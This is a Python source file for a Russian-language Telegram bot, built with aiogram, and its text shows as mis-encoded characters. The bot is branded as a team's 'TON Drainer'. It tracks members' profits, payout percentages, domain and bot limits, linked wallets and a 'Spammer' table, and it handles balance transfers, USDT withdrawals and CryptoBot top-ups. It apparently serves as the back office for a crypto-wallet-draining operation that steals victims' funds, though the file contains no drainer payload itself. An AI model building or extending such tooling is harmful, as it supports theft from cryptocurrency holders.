from decimal import Decimal

from aiocryptopay import AioCryptoPay
from aiogram import types, Router, F, Bot
from aiogram.filters import CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, Message
from sqlalchemy.ext.asyncio import AsyncSession
from utils import check_crypto_bot_invoice
import keyboards.main_keyboard
from states import states
from keyboards import main_keyboard
import config
from sqlalchemy import select
from database import models
from database.database import get_db
from database.models import User, CryptoBot_invoices, Spammer
from keyboards.main_keyboard import main_menu
from middlewares.user_middleware import AuthorizeMiddleware

router = Router()  # –°–æ–∑–¥–∞–µ–º —Ä–æ—É—Ç–µ—Ä –¥–ª—è –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤
router.message.middleware(AuthorizeMiddleware())
router.callback_query.middleware(AuthorizeMiddleware())


@router.message(CommandStart())
async def start(message: Message, session: AsyncSession):

    await message.answer("–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!", reply_markup=main_menu)
    result = await session.execute(select(Spammer).where(Spammer.user_tg_id == message.from_user.id))
    spammer = result.scalars().first()

    if not spammer:
        spammer = Spammer(user_tg_id=message.from_user.id)
        session.add(spammer)
        await session.commit()


@router.message(F.text == "üë§ –ú–æ–π –ø—Ä–æ—Ñ–∏–ª—å")  # –ò—Å–ø–æ–ª—å–∑—É–µ–º Text —Ñ–∏–ª—å—Ç—Ä
async def profile(message: Message, user: User):
    if user:
        text = (f"<b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ø—Ä–æ—Ñ–∏–ª—å</b>\n"
                f"<b>{config.TEAM_NAME} TON Drainer</b>\n\n"
                f"1Ô∏è‚É£ <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:</b>\n"
                f"‚îîüëâ TG ID: <code>{user.tg_id}</code>\n"
                f"‚îîüëâ –ü—Ä–æ—Ñ–∏–ª—å lolz: <code>{user.lolz_profile}\n</code>"
                f"‚îî‚ùï –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∫–∞ –≤ –≤—ã–ø–ª–∞—Ç–∞—Ö: <code>{user.nickname_display}</code>\n"
                f"‚îîüë§ –°—Ç–∞—Ç—É—Å: <code>{user.status}</code>\n"
                f"‚îîüí≤ –ü—Ä–æ—Ü–µ–Ω—Ç: <code>{user.percentage}</code>\n"
                f"‚îî‚ÅâÔ∏è –õ–∏–º–∏—Ç –¥–æ–º–µ–Ω–æ–≤: <code>{user.domains_limit}</code>\n"
                f"‚îî‚ÅâÔ∏è –õ–∏–º–∏—Ç –±–æ—Ç–æ–≤: <code>{user.bots_limit}</code>\n\n"
                f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n"
                f"‚îîüíµ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: <code>{user.balance}$</code>\n"
                f"‚îîüí∞ –ü—Ä–æ—Ñ–∏—Ç–æ–≤: <code>{user.profits}$</code>\n"
                f"‚îîüìÖ –î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: <code>{user.registration_date}</code>\n\n"
                f"üí≥ <b>–ü—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏:</b>\n"
                f"‚îîTON: <code>{user.ton_wallet}</code>\n")

        await message.answer(text, parse_mode='HTML', reply_markup=main_keyboard.profile_menu)
    else:
        await message.answer("–ü—Ä–æ—Ñ–∏–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.")


@router.callback_query(F.data == 'change_nickname')
async def change_nickname(call: CallbackQuery, session: AsyncSession, state: states.ProfileState.new_nickname):
    if call.data == 'change_nickname':
        await call.message.answer('–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –Ω–∏–∫–Ω–µ–π–º –Ω–∏–∂–µ.')
        await state.set_state(states.ProfileState.new_nickname)


@router.message(StateFilter(states.ProfileState.new_nickname))
async def nickname_set(message: Message, state: FSMContext, session: AsyncSession, user: User):
    new_nickname = message.text

    try:
        async with session.begin():  # Use async with for database operations
            user.nickname_display = new_nickname  # Update the nickname
            await session.commit()  # Commit the changes
            await message.answer(f"–ù–∏–∫–Ω–µ–π–º —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω –Ω–∞: {new_nickname}")

    except Exception as e:  # Handle potential errors
        await message.answer(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –Ω–∏–∫–Ω–µ–π–º–∞: {e}")
        await session.rollback()  # Rollback in case of error
    finally:
        await state.clear()  # Finish the state


@router.callback_query(F.data == 'transfer_funds')
async def transer_money(call: CallbackQuery, state: FSMContext):
    if call.data == 'transfer_funds':
        await call.message.answer("üîÑ –í–≤–µ–¥–∏—Ç–µ ID –∏–ª–∏ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞.")
        await state.set_state(states.ProfileState.id_or_nick)


@router.message(StateFilter(states.ProfileState.id_or_nick))
async def nick_for_transfer(message: Message, session: AsyncSession, user: User, state: FSMContext):
    nick_or_id = message.text
    try:
        async with session.begin():
            # 1. –ü—ã—Ç–∞–µ–º—Å—è –Ω–∞–π—Ç–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ nickname_display
            user_by_nickname = await session.execute(
                select(User).where(User.nickname_display == nick_or_id)
            )
            user_by_nickname = user_by_nickname.scalars().first()

            # 2. –ï—Å–ª–∏ –Ω–µ –Ω–∞—à–ª–∏ –ø–æ nickname_display, –ø—ã—Ç–∞–µ–º—Å—è –Ω–∞–π—Ç–∏ –ø–æ tg_id
            if not user_by_nickname:
                try:
                    nick_or_id = int(nick_or_id)  # Try converting to int first
                    user_by_tg_id = await session.execute(
                        select(User).where(User.tg_id == nick_or_id)  # Use select for tg_id
                    )
                    user_by_tg_id = user_by_tg_id.scalars().first()
                except ValueError:  # Handle cases where nick_or_id is not an integer
                    user_by_tg_id = None
            else:
                user_by_tg_id = None

            user_found = user_by_nickname or user_by_tg_id

            if user_found and user_found.id != user.id:
                # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞–π–¥–µ–Ω –∏ —ç—Ç–æ –Ω–µ —Ç–µ–∫—É—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
                # ... (–ª–æ–≥–∏–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è user_found)
                await message.answer(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {nick_or_id} –Ω–∞–π–¥–µ–Ω. ID: {user_found.id}\n"
                                     f"–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –≤ $ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞. –ú–∞–∫—Å–∏–º—É–º –¥–≤–µ —Ü–∏—Ñ—Ä—ã –ø–æ—Å–ª–µ —Ç–æ—á–∫–∏, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –Ω–µ –±—É–¥—É—Ç —É—á–∏—Ç—ã–≤–∞—Ç—å—Å—è (–ü—Ä–∏–º–µ—Ä: 2.56)")
                await state.update_data(id_or_nick=user_found.tg_id)  # Store the user object
                await state.set_state(states.ProfileState.transfer_amount)
            else:
                # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –ø—ã—Ç–∞–µ—Ç—Å—è –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ —Å–µ–±–µ
                await message.answer(
                    "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –≤—ã –Ω–µ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ —Å–µ–±–µ. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –∑–∞–Ω–æ–≤–æ.")
                await state.clear()  # –û—Å—Ç–∞–µ–º—Å—è –≤ —ç—Ç–æ–º —Å–æ—Å—Ç–æ—è–Ω–∏–∏

    except Exception as e:
        await message.answer(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}")
        await session.rollback()
        await state.clear()


@router.message(StateFilter(states.ProfileState.transfer_amount))
async def amount_for_transfer(message: Message, session: AsyncSession, user: User,
                              state: FSMContext, bot: Bot):
    amount_str = message.text  # –ü–æ–ª—É—á–∞–µ–º —Å—É–º–º—É –∫–∞–∫ —Å—Ç—Ä–æ–∫—É

    try:
        amount = float(amount_str)  # –ü—ã—Ç–∞–µ–º—Å—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –≤ float
    except ValueError:
        await message.answer("–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —á–∏—Å–ª–æ–º. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ—á–∫—É –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        await state.clear()
        return  # –í—ã—Ö–æ–¥–∏–º –∏–∑ —Ñ—É–Ω–∫—Ü–∏–∏, –µ—Å–ª–∏ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –Ω–µ —É–¥–∞–ª–æ—Å—å

    if amount <= 0:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å—É–º–º–∞ –±–æ–ª—å—à–µ –Ω—É–ª—è
        await message.answer("–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –±–æ–ª—å—à–µ –Ω—É–ª—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        await state.clear()
        return

    amount = round(amount, 2)

    if amount > user.balance:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ª–∏ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ. –ü–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        await state.clear()
        return

    data = await state.get_data()
    user_nick_or_id = data.get("id_or_nick")
    try:
        async with session.begin():
            user_found_result = await session.execute(select(User).where(User.tg_id == user_nick_or_id))
            user_found = user_found_result.scalars().first()

            if user_found:
                if user_found.id == user.id:
                    await message.answer("–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ —Å–µ–±–µ.")
                    return

                # –í—ã–ø–æ–ª–Ω—è–µ–º –ø–µ—Ä–µ–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤
                user.balance = Decimal(str(user.balance)) - Decimal(str(amount))  # Subtract
                user_found.balance = Decimal(str(user_found.balance)) + Decimal(str(amount))  # Add

                await session.commit()  # –§–∏–∫—Å–∏—Ä—É–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö

                await message.answer(
                    f"–ü–µ—Ä–µ–≤–æ–¥ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω. {amount} $ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {user_nick_or_id} —Å –Ω–∏–∫–Ω–µ–º–æ–º: {user_found.nickname_display}.")
                await bot.send_message(user_found.tg_id,
                                       text=f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user.tg_id} –∏–ª–∏ {user.nickname_display} –ø–µ—Ä–µ–≤–µ–ª –≤–∞–º {amount} $')
                await state.clear()
            else:
                await message.answer("–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω.")
                await state.clear()  # –û—Å—Ç–∞–µ–º—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ id_or_nick

    except Exception as e:
        await message.answer(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–≤–æ–¥–µ —Å—Ä–µ–¥—Å—Ç–≤: {e}")
        await session.rollback()
    finally:
        await state.clear()


@router.callback_query(F.data == 'withdraw_funds')
async def withdraw_money(call: CallbackQuery, state: FSMContext):
    if call.data == 'withdraw_funds':
        await call.message.answer(
            '–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞ –≤ $. –ú–∞–∫—Å–∏–º—É–º –¥–≤–µ —Ü–∏—Ñ—Ä—ã –ø–æ—Å–ª–µ —Ç–æ—á–∫–∏, –æ—Å—Ç–∞–ª—å–Ω—ã–µ –Ω–µ –±—É–¥—É—Ç —É—á–∏—Ç—ã–≤–∞—Ç—å—Å—è (–ü—Ä–∏–º–µ—Ä: 2.56)')
        await state.set_state(states.ProfileState.withdraw_amount)


@router.message(StateFilter(states.ProfileState.withdraw_amount))
async def withdraw_amount(message: Message, state: FSMContext, user: User):
    amount_str = message.text  # –ü–æ–ª—É—á–∞–µ–º —Å—É–º–º—É –∫–∞–∫ —Å—Ç—Ä–æ–∫—É

    try:
        amount = float(amount_str)  # –ü—ã—Ç–∞–µ–º—Å—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –≤ float
    except ValueError:
        await message.answer("–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å —á–∏—Å–ª–æ–º. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ—á–∫—É –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        await state.clear()
        return  # –í—ã—Ö–æ–¥–∏–º –∏–∑ —Ñ—É–Ω–∫—Ü–∏–∏, –µ—Å–ª–∏ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –Ω–µ —É–¥–∞–ª–æ—Å—å

    if amount <= 0:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ —Å—É–º–º–∞ –±–æ–ª—å—à–µ –Ω—É–ª—è
        await message.answer("–°—É–º–º–∞ –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –±–æ–ª—å—à–µ –Ω—É–ª—è. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        await state.clear()
        return

    amount = round(amount, 2)

    if amount > user.balance:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ª–∏ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ
        await message.answer("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –±–∞–ª–∞–Ω—Å–µ. –ü–æ–ø–æ–ª–Ω–∏—Ç–µ –±–∞–ª–∞–Ω—Å –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑.")
        await state.clear()
        return

    await state.update_data(withdraw_amount=amount)
    await message.answer(
        'üñá –ü—Ä–∏—à–ª–∏—Ç–µ –∞–¥—Ä–µ—Å –≤–∞—à–µ–≥–æ –∫–æ—à–µ–ª—å–∫–∞ USDT –≤ –°–µ—Ç–∏ TRC-20\n<b>‚ùóÔ∏è–í–∞–∂–Ω–æ, –µ—Å–ª–∏ –≤—ã –ø—Ä–∏—à–ª–µ—Ç–µ –Ω–µ–≤–µ—Ä–Ω—ã–π –∞–¥—Ä–µ—Å –∏–ª–∏ –∞–¥—Ä–µ—Å –¥—Ä—É–≥–æ–π —Å–µ—Ç–∏, —Ç–æ –¥–µ–Ω—å–≥–∏ –º–æ–≥—É—Ç –Ω–µ –ø–æ—Å—Ç—É–ø–∏—Ç—å‚ùóÔ∏è</b>', parse_mode='HTML')
    await state.set_state(states.ProfileState.withdraw_wallet)


@router.message(StateFilter(states.ProfileState.withdraw_wallet))
async def withdraw_wallet(message: Message, state: FSMContext, user: User):
    wallet = message.text
    await state.update_data(withdraw_wallet=wallet)
    data = await state.get_data()
    amount = data.get('withdraw_amount')
    wallet = data.get('withdraw_wallet')
    await message.answer(f'–í—ã —É–≤–µ—Ä–µ–Ω—ã —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–≤–µ—Å—Ç–∏ {amount} $ –Ω–∞ –∞–¥—Ä–µ—Å {wallet}?',
                         reply_markup=keyboards.main_keyboard.withdraw_decision_kb)


@router.callback_query(F.data == 'withdraw_confirm')
async def confirm_withdraw(call: CallbackQuery, state: FSMContext, user: User, session: AsyncSession, bot: Bot):
    data = await state.get_data()
    amount = data.get('withdraw_amount')
    wallet = data.get('withdraw_wallet')
    await state.clear()
    try:
        async with session.begin():
            user.balance = Decimal(str(user.balance)) - Decimal(str(amount))  # Subtract
            await session.commit()  # –§–∏–∫—Å–∏—Ä—É–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö
            await call.message.answer(f'–í—ã–≤–æ–¥ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω. –û–∂–∏–¥–∞–π—Ç–µ –≤—ã–≤–æ–¥–∞ –æ—Ç –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.')
            for id in config.ADMINS_IDS:
                await bot.send_message(id,
                                       text=f'–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user.tg_id} –∏–ª–∏ {user.nickname_display} —Ö–æ—á–µ—Ç –≤—ã–≤–µ—Å—Ç–∏ {amount} $ –Ω–∞ –∞–¥—Ä–µ—Å {wallet}')
    except Exception as e:
        await call.message.answer(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–≤–æ–¥–µ —Å—Ä–µ–¥—Å—Ç–≤: {e}")
        await session.rollback()


@router.callback_query(F.data == 'withdraw_cancel')
async def cancel_withdraw(call: CallbackQuery, state: FSMContext):
    await state.clear()
    await call.message.answer('–í—ã–≤–æ–¥ –æ—Ç–º–µ–Ω–µ–Ω.')


@router.callback_query(F.data == 'top_up')
async def top_up_money(call: CallbackQuery, state: FSMContext):
    if call.data == 'top_up':
        crypto_bot_link = "https://t.me/CryptoBot"
        message_text = (
            f'<b><a href="{crypto_bot_link}">‚öúÔ∏è CryptoBot</a></b>\n\n'
            '‚Äî –ú–∏–Ω–∏–º—É–º: <b>0.1 $</b>\n\n'
            '<b>üí∏ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –≤ –¥–æ–ª–ª–∞—Ä–∞—Ö</b>'
        )
        await call.message.edit_text(text=message_text, parse_mode='HTML', disable_web_page_preview=True)
        await state.set_state(states.ProfileState.top_up_amount)


@router.message(StateFilter(states.ProfileState.top_up_amount))
async def change_balance(message: Message, state: FSMContext):
    try:
        if float(message.text) >= 0.1:

            crypto_bot_link = "https://t.me/CryptoBot"
            message_text = (
                f'<b><a href="{crypto_bot_link}">‚öúÔ∏è CryptoBot</a></b>\n\n'
                f'‚Äî –°—É–º–º–∞: <b>{message.text} $</b>\n\n'
                '<b>üí∏ –í—ã–±–µ—Ä–∏—Ç–µ –≤–∞–ª—é—Ç—É, –∫–æ—Ç–æ—Ä–æ–π —Ö–æ—Ç–∏—Ç–µ –æ–ø–ª–∞—Ç–∏—Ç—å —Å—á—ë—Ç</b>'
            )
            await message.answer(text=message_text, parse_mode='HTML', disable_web_page_preview=True,
                                 reply_markup=keyboards.main_keyboard.get_crypto_bot_currencies())
            await state.update_data(top_up_amount=float(message.text))
        else:
            await message.answer(
                '<b>‚ö†Ô∏è –ú–∏–Ω–∏–º—É–º: 0.1 $!<b>'
            )
    except ValueError:
        await message.answer(
            '<b>‚ùóÔ∏è–°—É–º–º–∞ –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –≤ —á–∏—Å–ª–æ–≤–æ–º —Ñ–æ—Ä–º–∞—Ç–µ!</b>', parse_mode='HTML'
        )


@router.callback_query(lambda callback_query: callback_query.data.startswith('crypto_bot_currency|'))
async def set_payment_crypto_bot(callback_query: types.CallbackQuery, state: FSMContext, bot: Bot, session: AsyncSession):  # Add bot argument
    try:
        await callback_query.message.delete()  # Delete the initial message with the currency buttons

        cryptopay = AioCryptoPay(config.CRYPTO_BOT_TOKEN)
        asset = callback_query.data.split('|')[1].upper()
        payment_data = await state.get_data()
        amount = payment_data.get('top_up_amount')
        invoice = await cryptopay.create_invoice(asset=asset, amount=amount)
        await cryptopay.close()

        # Send the payment message *before* interacting with the database
        payment_message = await callback_query.message.answer(  # Capture the message object
            f'<b>üí∏ –û—Ç–ø—Ä–∞–≤—å—Ç–µ {amount} $ <a href="{invoice.bot_invoice_url}">–ø–æ —Å—Å—ã–ª–∫–µ</a></b>',
            parse_mode='HTML',
            reply_markup=keyboards.main_keyboard.check_crypto_bot_kb(invoice.bot_invoice_url, invoice.invoice_id)
        )
        await state.clear()

        try:
            async with session:  # Create a new session within the context
                try:
                    existing_invoice = await session.execute(
                        select(CryptoBot_invoices).where(CryptoBot_invoices.invoice_id == invoice.invoice_id)
                    )
                    existing_invoice = existing_invoice.scalars().first()

                    if existing_invoice:
                        existing_invoice.amount = amount
                    else:
                        new_invoice = CryptoBot_invoices(invoice_id=invoice.invoice_id, amount=amount)
                        session.add(new_invoice)

                    await session.commit()
                    await session.refresh(new_invoice if not existing_invoice else existing_invoice)

                except Exception as db_e:  # Catch database errors separately
                    await session.rollback()
                    print(f"Database error: {db_e}")  # Log the database error
                    await payment_message.edit_text(  # Edit the payment message
                        f"<b>‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –∏–Ω–≤–æ–π—Å–∞: {db_e}</b>", parse_mode="HTML"
                    )
                    return  # Stop processing if database error

        except Exception as e:  # Catch cryptopay errors
            print(f"CryptoPay error: {e}")  # Log the CryptoPay error
            await payment_message.edit_text(  # Edit the payment message
                f"<b>‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∏–Ω–≤–æ–π—Å–∞: {e}</b>", parse_mode="HTML"
            )
            return  # Stop processing if CryptoPay error

    except Exception as final_e:  # Catch any other errors
        print(f"Unexpected error: {final_e}")  # Log the unexpected error
        await callback_query.message.answer(f'<b>‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {final_e}</b>', parse_mode="HTML")


@router.callback_query(lambda callback_query: callback_query.data.startswith('check_crypto_bot'))
async def check_crypto_bot(call: types.CallbackQuery, state: FSMContext, user: User, session: AsyncSession):
    async with session.begin():
        payment = await session.execute(
            select(CryptoBot_invoices).where(CryptoBot_invoices.invoice_id == int(call.data.split('|')[1]))
        )
        payment = payment.scalars().first()
    if payment:
        if await check_crypto_bot_invoice(int(call.data.split('|')[1])):
            async with session.begin():
                user.balance = Decimal(str(user.balance)) + Decimal(str(payment.amount))  # Add
                await session.commit()  # –§–∏–∫—Å–∏—Ä—É–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö
            await call.answer(
                '‚úÖ –û–ø–ª–∞—Ç–∞ –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!',
                show_alert=True
            )
            await call.message.delete()
            await call.message.answer(
                f'<b>üí∏ –í–∞—à –±–∞–ª–∞–Ω—Å –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ —Å—É–º–º—É {payment.amount} $!</b>', parse_mode='HTML'
            )
            await state.clear()
            for admin in config.ADMINS_IDS:
                await call.bot.send_message(
                    admin,
                    f'<b><a href="https://t.me/CryptoBot">‚öúÔ∏è CryptoBot</a></b>\n'
                    f'<b>üí∏ –û–±–Ω–∞—Ä—É–∂–µ–Ω–æ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –æ—Ç @{call.from_user.username} [<code>{call.from_user.id}</code>] '
                    f'–Ω–∞ —Å—É–º–º—É {payment.amount} $!</b>', parse_mode='HTML'
                )
        else:
            await call.answer(
                '‚ùóÔ∏è –í—ã –Ω–µ –æ–ø–ª–∞—Ç–∏–ª–∏ —Å—á—ë—Ç!',
                show_alert=True
            )


@router.callback_query(F.data == 'cancel_crypto_bot')
async def cancel_crypto_bot(call: types.CallbackQuery, state: FSMContext, user: User):
    await state.clear()
    if user:
        text = (f"<b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ø—Ä–æ—Ñ–∏–ª—å</b>\n"
                f"<b>{config.TEAM_NAME} TON Drainer</b>\n\n"
                f"1Ô∏è‚É£ <b>–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:</b>\n"
                f"‚îîüëâ TG ID: <code>{user.tg_id}</code>\n"
                f"‚îîüëâ –ü—Ä–æ—Ñ–∏–ª—å lolz: <code>{user.lolz_profile}\n</code>"
                f"‚îî‚ùï –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∫–∞ –≤ –≤—ã–ø–ª–∞—Ç–∞—Ö: <code>{user.nickname_display}</code>\n"
                f"‚îîüë§ –°—Ç–∞—Ç—É—Å: <code>{user.status}</code>\n"
                f"‚îîüí≤ –ü—Ä–æ—Ü–µ–Ω—Ç: <code>{user.percentage}</code>\n"
                f"‚îî‚ÅâÔ∏è –õ–∏–º–∏—Ç –¥–æ–º–µ–Ω–æ–≤: <code>{user.domains_limit}</code>\n"
                f"‚îî‚ÅâÔ∏è –õ–∏–º–∏—Ç –±–æ—Ç–æ–≤: <code>{user.bots_limit}</code>\n\n"
                f"üìä <b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>\n"
                f"‚îîüíµ –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: <code>{user.balance}$</code>\n"
                f"‚îîüí∞ –ü—Ä–æ—Ñ–∏—Ç–æ–≤: <code>{user.profits}$</code>\n"
                f"‚îîüìÖ –î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: <code>{user.registration_date}</code>\n\n"
                f"üí≥ <b>–ü—Ä–∏–≤—è–∑–∞–Ω–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏:</b>\n"
                f"‚îîTON: <code>{user.ton_wallet}</code>\n")

        await call.message.answer(text, parse_mode='HTML', reply_markup=main_keyboard.profile_menu)